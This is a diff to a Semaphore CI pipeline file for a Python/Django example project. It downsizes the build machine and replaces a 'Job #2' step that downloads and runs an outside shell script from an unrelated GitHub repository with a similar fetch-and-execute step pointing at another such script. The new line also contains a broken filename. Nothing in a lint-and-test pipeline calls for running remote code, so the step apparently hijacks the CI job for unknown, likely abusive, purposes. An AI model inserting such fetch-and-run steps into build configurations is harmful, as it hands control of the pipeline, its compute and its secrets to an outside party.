@@ -2,7 +2,7 @@ version: v1.0
 name: Semaphore Python / Django Example Pipeline
 agent:
   machine:
-    type: e1-standard-8
+    type: e1-standard-4
     os_image: ubuntu1804
 execution_time_limit:
   hours: 12
@@ -36,7 +36,7 @@ blocks:
             - git ls-files | grep -v 'migrations' | grep -v 'settings.py' | grep -v 'manage.py' | grep -E '.py$' | xargs pylint -E --load-plugins=pylint_django
         - name: 'Job #2'
           commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.s'
   - name: Run Unit Tests
     task:
       prologue:
